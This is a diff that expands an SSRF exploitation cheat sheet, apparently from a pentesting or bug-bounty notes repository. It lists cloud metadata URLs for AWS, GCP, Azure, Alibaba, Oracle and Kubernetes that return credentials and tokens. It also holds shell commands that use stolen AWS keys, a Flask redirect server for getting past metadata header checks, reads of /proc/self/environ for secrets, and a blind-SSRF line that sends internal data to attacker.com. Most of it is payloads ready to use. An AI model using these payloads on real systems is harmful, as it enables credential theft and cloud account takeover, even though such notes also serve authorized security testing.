@@ -2,9 +2,13 @@
 
 You have SSRF. Now maximize impact.
 
+---
+
 ## Cloud Metadata
 
-### AWS IMDSv1
+### AWS EC2 (IMDSv1)
+
+**No authentication required - just GET requests**
 
 ```bash
 # Instance info
@@ -14,80 +18,208 @@ http://169.254.169.254/latest/meta-data/hostname
 http://169.254.169.254/latest/meta-data/local-ipv4
 http://169.254.169.254/latest/meta-data/public-ipv4
 
-# IAM credentials (JACKPOT)
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
-
-# User data (may contain secrets)
-http://169.254.169.254/latest/user-data
-
-# Identity document
+# Identity document (JSON)
 http://169.254.169.254/latest/dynamic/instance-identity/document
+
+# IAM Role discovery
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+# Credential extraction (replace ROLE-NAME)
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE-NAME]
+
+# User data (often contains secrets/scripts)
+http://169.254.169.254/latest/user-data
+```
+
+**Credential Response Format:**
+```json
+{
+  "AccessKeyId": "ASIA...",
+  "SecretAccessKey": "...",
+  "Token": "...",
+  "Expiration": "2025-02-05T18:34:56Z"
+}
+```
+
+**Use stolen credentials:**
+```bash
+export AWS_ACCESS_KEY_ID=ASIA...
+export AWS_SECRET_ACCESS_KEY=...
+export AWS_SESSION_TOKEN=...
+aws sts get-caller-identity
+aws s3 ls
+aws ec2 describe-instances
+aws iam list-users
 ```
 
 **Impact:** IAM credentials → AWS account compromise
 
-### AWS IMDSv2 (Harder)
+### AWS IMDSv2 (Token Required)
 
-Requires header: `X-aws-ec2-metadata-token`
+Requires PUT + custom headers (harder to exploit):
 
 ```bash
-# First, get token (requires PUT with header)
-# Usually blocked by SSRF
+# Step 1: Get token (PUT request needed)
+TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
 
-# If you can set headers:
-PUT http://169.254.169.254/latest/api/token
-X-aws-ec2-metadata-token-ttl-seconds: 21600
+# Step 2: Use token
+curl -H "X-aws-ec2-metadata-token: $TOKEN" \
+  http://169.254.169.254/latest/meta-data/
 ```
 
-### GCP
+**IMDSv2 Bypass attempts:**
+- Need SSRF that allows PUT + custom headers
+- Hop limit = 1 (blocks container access)
+- Blocks X-Forwarded-For header
+
+### AWS ECS Containers
 
 ```bash
-# Requires header: Metadata-Flavor: Google
+# Credentials via container endpoint
+http://169.254.170.2/v2/credentials/[GUID]
 
-http://169.254.169.254/computeMetadata/v1/
-http://169.254.169.254/computeMetadata/v1/instance/hostname
-http://169.254.169.254/computeMetadata/v1/instance/service-accounts/
-http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
-http://169.254.169.254/computeMetadata/v1/project/project-id
-
-# Alternative
-http://metadata.google.internal/computeMetadata/v1/
+# GUID from environment variable
+file:///proc/self/environ
+# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
 ```
 
-### Azure
+### AWS Lambda
 
 ```bash
-# Requires header: Metadata: true
+# Credentials in environment variables
+file:///proc/self/environ
+# Variables: AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN
 
-http://169.254.169.254/metadata/instance?api-version=2021-02-01
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
-http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net
+# Event data
+http://localhost:9001/2018-06-01/runtime/invocation/next
 ```
 
-### DigitalOcean
+---
+
+### Google Cloud Platform (GCP)
+
+**Requires header: `Metadata-Flavor: Google`** (Use redirect to bypass)
 
 ```bash
-http://169.254.169.254/metadata/v1/
+# Project info
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/project/numeric-project-id
+
+# Instance info
+http://metadata.google.internal/computeMetadata/v1/instance/hostname
+http://metadata.google.internal/computeMetadata/v1/instance/zone
+
+# Service account token (HIGH VALUE)
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# List service accounts
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
+
+# Kubernetes config
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+```
+
+**Beta API (no header required - legacy):**
+```bash
+http://metadata.google.internal/computeMetadata/v1beta1/
+http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
+```
+
+**Use GCP token:**
+```bash
+export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
+gcloud projects list
+```
+
+---
+
+### Microsoft Azure
+
+**Requires header: `Metadata: true`**
+
+```bash
+# Instance info
+http://169.254.169.254/metadata/instance?api-version=2021-12-13
+
+# Management token
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://management.azure.com/
+
+# Graph token
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://graph.microsoft.com/
+
+# Key Vault token
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-12-13&resource=https://vault.azure.net/
+
+# User data
+http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text
+```
+
+**Legacy endpoint (no header):**
+```bash
+http://169.254.169.254/metadata/v1/instanceinfo
+```
+
+### Azure App Services/Functions
+
+```bash
+# Check environment
+echo $IDENTITY_ENDPOINT
+echo $IDENTITY_HEADER
+
+# Get tokens
+curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2019-08-01" \
+  -H "X-IDENTITY-HEADER:$IDENTITY_HEADER"
+```
+
+---
+
+### Other Cloud Providers
+
+**DigitalOcean** (169.254.169.254)
+```bash
 http://169.254.169.254/metadata/v1.json
-http://169.254.169.254/metadata/v1/id
-http://169.254.169.254/metadata/v1/hostname
 http://169.254.169.254/metadata/v1/user-data
 ```
 
-### Kubernetes
-
+**Alibaba Cloud** (100.100.100.200) - *Often bypasses private IP filters!*
 ```bash
-# Service account token
-http://169.254.169.254/latest/meta-data/iam/security-credentials/
-
-# Kubernetes API (if accessible)
-https://kubernetes.default.svc/api/
-https://kubernetes.default.svc/api/v1/namespaces
-https://kubernetes.default.svc/api/v1/secrets
+http://100.100.100.200/latest/meta-data/
+http://100.100.100.200/latest/meta-data/ram/security-credentials/[ROLE-NAME]
 ```
 
-## Internal Services RCE
+**Oracle Cloud** (169.254.169.254 or 192.0.0.192)
+```bash
+http://169.254.169.254/opc/v1/instance/
+http://192.0.0.192/latest/meta-data/
+```
+
+**Kubernetes** (internal)
+```bash
+https://kubernetes.default.svc/api/v1/secrets
+https://kubernetes.default.svc/api/v1/namespaces/default/pods
+# Token: /var/run/secrets/kubernetes.io/serviceaccount/token
+```
+
+---
+
+## Metadata Header Bypass via Redirect
+
+For GCP/Azure that require headers:
+
+```python
+# Redirect server that adds required headers
+from flask import Flask, redirect
+app = Flask(__name__)
+
+@app.route('/gcp')
+def gcp():
+    return redirect('http://metadata.google.internal/computeMetadata/v1/', code=302)
+```
+
+---
+
+## Internal Services → RCE
 
 ### Redis → RCE
 
@@ -151,6 +283,8 @@ http://127.0.0.1/zabbix/
 http://127.0.0.1:5601/
 ```
 
+---
+
 ## Chaining SSRF
 
 ### SSRF → AWS Takeover
@@ -159,19 +293,6 @@ http://127.0.0.1:5601/
 2. Retrieve IAM credentials
 3. Use AWS CLI with stolen creds
 4. Enumerate permissions, escalate
-
-```bash
-# Use stolen creds
-export AWS_ACCESS_KEY_ID=AKIA...
-export AWS_SECRET_ACCESS_KEY=...
-export AWS_SESSION_TOKEN=...
-
-# Enumerate
-aws sts get-caller-identity
-aws s3 ls
-aws ec2 describe-instances
-aws iam list-users
-```
 
 ### SSRF → Internal App Takeover
 
@@ -191,7 +312,26 @@ If you can only trigger requests but not see responses:
 ?url=http://attacker.com/log?data=INTERNAL_DATA
 ```
 
-## Impact Examples
+---
+
+## Real-World Examples
+
+| Company | Technique | Impact |
+|---------|-----------|--------|
+| Capital One | WAF SSRF → AWS metadata | 100M records breached |
+| DuckDuckGo | Image proxy SSRF | Full AWS metadata |
+| GitLab | DNS rebinding | IAM credentials |
+| Shopify | SSRF in testing env | GCP metadata attempted |
+
+**GitLab DNS Rebinding Example:**
+```
+1. First resolution: evil.com → 8.8.8.8 (passes check)
+2. Second resolution: evil.com → 169.254.169.254 (actual request)
+```
+
+---
+
+## Impact Table
 
 | Scenario | Severity |
 |----------|----------|
@@ -201,6 +341,14 @@ If you can only trigger requests but not see responses:
 | Access cloud metadata | High |
 | Retrieve IAM credentials | Critical |
 | RCE via internal service | Critical |
+
+---
+
+## Tools
+
+- **PACU** - AWS exploitation framework
+- **ScoutSuite** - Multi-cloud security auditing
+- **Prowler** - AWS security assessment
 
 ---
 
